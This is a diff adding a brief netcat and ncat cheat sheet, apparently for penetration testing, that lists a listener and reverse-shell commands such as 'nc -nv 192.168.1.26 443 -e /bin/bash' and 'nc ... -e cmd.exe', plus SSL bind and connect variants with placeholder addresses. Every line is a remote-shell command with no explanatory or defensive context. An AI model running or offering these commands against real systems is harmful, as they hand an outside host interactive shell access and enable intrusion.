@@ -1,0 +1,11 @@
+nc -nlvp 4444
+
+
+nc -nv 192.168.1.26 443 -e /bin/bash
+nc -nv 10.0.0.22 4444 -e cmd.exe
+
+
+===========ncat=====
+ncat -lvp 444 -e cmd.exe --allow {IP address} --ssl
+ncat -v {Target IP} 4444 --ssl
+
